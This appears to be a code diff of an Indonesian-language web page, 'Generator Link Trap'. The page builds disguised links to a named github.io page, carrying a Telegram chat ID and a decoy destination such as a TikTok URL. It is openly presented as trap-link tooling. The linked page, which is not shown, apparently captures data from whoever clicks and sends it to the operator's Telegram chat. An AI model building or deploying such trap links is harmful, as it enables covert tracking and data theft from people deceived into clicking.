@@ -1,75 +1,120 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="id">
 <head>
-    <title>Generator Trap Link</title>
-    <meta charset="UTF-8">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #0d1117;
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        input {
-            padding: 10px;
-            margin: 8px;
-            border: none;
-            border-radius: 5px;
-            width: 300px;
-        }
-        button {
-            padding: 10px 20px;
-            background: #238636;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #2ea043;
-        }
-        .output {
-            margin-top: 20px;
-            background: #161b22;
-            padding: 15px;
-            border-radius: 5px;
-            word-break: break-word;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Generator Link Trap</title>
+  <style>
+    body{font-family:Arial,Helvetica,sans-serif;background:#f6f7fb;padding:28px;display:flex;justify-content:center}
+    .card{width:100%;max-width:760px;background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.08)}
+    h2{margin:0 0 10px}
+    label{display:block;margin-top:12px;font-weight:600}
+    input[type="text"]{width:100%;padding:10px;margin-top:8px;border:1px solid #ddd;border-radius:6px;font-size:14px}
+    .controls{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+    button{padding:10px 14px;border:none;border-radius:8px;cursor:pointer;font-size:14px}
+    .btn-gen{background:#2563eb;color:#fff}
+    .btn-clear{background:#6b7280;color:#fff}
+    .result-row{margin-top:16px;display:flex;gap:8px;align-items:center}
+    .result-input{flex:1;padding:10px;border-radius:6px;border:1px solid #e5e7eb;background:#f8fafc;font-size:13px}
+    .btn-copy{background:#059669;color:#fff}
+    .btn-open{background:#111827;color:#fff}
+    .note{margin-top:12px;color:#555;font-size:13px}
+  </style>
 </head>
 <body>
+  <div class="card">
+    <h2>Generator Link Trap</h2>
+    <p>Isi Chat ID Telegram dan link tujuan (contoh: https://www.tiktok.com/…)</p>
 
-    <h1>Generator Trap Link</h1>
-    <p>Masukkan Chat ID Telegram dan Link Tujuan</p>
+    <label for="chatId">Chat ID Telegram</label>
+    <input id="chatId" type="text" placeholder="Masukkan Chat ID (contoh: 8073946537)">
 
-    <input type="text" id="chatId" placeholder="Masukkan Chat ID Telegram">
-    <br>
-    <input type="text" id="targetLink" placeholder="Masukkan Link Tujuan (contoh: https://tiktok.com/...)">
-    <br>
-    <button onclick="generateLink()">Buat Link Trap</button>
+    <label for="targetLink">Link target</label>
+    <input id="targetLink" type="text" placeholder="Masukkan link tujuan (contoh: https://tiktok.com/… )">
 
-    <div class="output" id="output"></div>
+    <div class="controls">
+      <button id="btnGenerate" class="btn-gen">Generate</button>
+      <button id="btnClear" class="btn-clear">Clear</button>
+    </div>
 
-    <script>
-        function generateLink() {
-            let chatId = document.getElementById("chatId").value.trim();
-            let target = document.getElementById("targetLink").value.trim();
+    <div class="result-row" id="resultRow" style="display:none">
+      <input id="resultLink" class="result-input" readonly>
+      <button id="btnCopy" class="btn-copy">Copy</button>
+      <button id="btnOpen" class="btn-open">Open</button>
+    </div>
 
-            if (!chatId || !target) {
-                alert("Harap isi semua kolom!");
-                return;
-            }
+    <div class="note">
+      Catatan: pastikan file <code>github.html</code> berada di:
+      <strong>https://ifufvjhcrjb.github.io/Web/github.html</strong>
+      sehingga link yang dihasilkan bekerja dengan benar.
+    </div>
+  </div>
 
-            let encodedTarget = encodeURIComponent(target);
-            let link = window.location.origin + "/Web/github.html?chatid=" + chatId + "&target=" + encodedTarget;
+<script>
+  const base = "https://ifufvjhcrjb.github.io/Web/github.html";
 
-            document.getElementById("output").innerHTML = `
-                <p>Link Trap:</p>
-                <input type="text" value="${link}" readonly>
-            `;
-        }
-    </script>
+  const btnGenerate = document.getElementById('btnGenerate');
+  const btnClear = document.getElementById('btnClear');
+  const chatInput = document.getElementById('chatId');
+  const targetInput = document.getElementById('targetLink');
+  const resultRow = document.getElementById('resultRow');
+  const resultLink = document.getElementById('resultLink');
+  const btnCopy = document.getElementById('btnCopy');
+  const btnOpen = document.getElementById('btnOpen');
 
+  btnGenerate.addEventListener('click', () => {
+    const chat = chatInput.value.trim();
+    const target = targetInput.value.trim();
+    if (!chat || !target) {
+      alert('Harap isi Chat ID dan Link target!');
+      return;
+    }
+    // validasi sederhana URL
+    try {
+      new URL(target);
+    } catch(e) {
+      if (!/^https?:\/\//i.test(target)) {
+        alert('Link target tidak valid. Pastikan diawali http:// atau https://');
+        return;
+      }
+    }
+
+    const encoded = encodeURIComponent(target);
+    const final = `${base}?chatid=${encodeURIComponent(chat)}&target=${encoded}`;
+    resultLink.value = final;
+    resultRow.style.display = 'flex';
+    resultLink.select();
+  });
+
+  btnClear.addEventListener('click', () => {
+    chatInput.value = '';
+    targetInput.value = '';
+    resultLink.value = '';
+    resultRow.style.display = 'none';
+  });
+
+  btnCopy.addEventListener('click', async () => {
+    const txt = resultLink.value;
+    if (!txt) return;
+    try {
+      await navigator.clipboard.writeText(txt);
+      alert('Link berhasil disalin ke clipboard!');
+    } catch(e) {
+      resultLink.select();
+      try { document.execCommand('copy'); alert('Link berhasil disalin!'); }
+      catch(err) { alert('Gagal salin otomatis — silakan salin manual.'); }
+    }
+  });
+
+  btnOpen.addEventListener('click', () => {
+    const url = resultLink.value;
+    if (!url) return;
+    window.open(url, '_blank');
+  });
+
+  // Enter to generate
+  targetInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') btnGenerate.click(); });
+  chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') btnGenerate.click(); });
+</script>
 </body>
 </html>
